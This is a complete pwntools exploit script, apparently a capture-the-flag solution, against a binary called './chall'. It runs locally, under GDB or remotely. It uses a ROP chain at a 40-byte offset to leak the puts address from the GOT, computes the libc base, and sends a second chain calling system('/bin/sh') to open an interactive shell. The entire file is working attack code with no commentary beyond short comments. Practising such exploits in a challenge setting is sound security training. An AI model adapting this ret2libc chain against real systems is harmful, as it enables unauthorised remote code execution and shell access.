#!/usr/bin/python3
# Author: Hack.You
from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './chall'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# # Load libc library (identified version from server - https://libc.blukat.me)
# libc = ELF('libc6_2.23-0ubuntu11.2_amd64.so')
libc = elf.libc

offset = 40
pop_rdi = 0x0000000000401303 # pop rdi; ret; 
ret = 0x000000000040101a # ret; 


payload = flat({
    offset: [
        pop_rdi,
        elf.got['puts'],
        elf.plt['puts'],
        elf.symbols['main']
    ]
})

io.recvuntil('I ask you what your heart desire ?')
io.sendline('leak got puts')

# Leak address
io.sendline(payload) 
io.recvuntil('I hear the secrets that you keep !')
io.recvline()
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("got puts: %#x", got_puts)

# Calculate libc base
libc.address = got_puts - libc.symbols['puts']
info("libc_base: %#x", libc.address)

sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']
info('/bin/sh: %#x', sh)
info('system: %#x', system)

# Payload to spawn shell
payload = flat({
    offset: [
        pop_rdi, # System("/bin/sh")
        sh,
        ret,
        system
    ]
})

io.sendline('shell xD')
io.sendline(payload)

# Got Shell?
io.interactive()
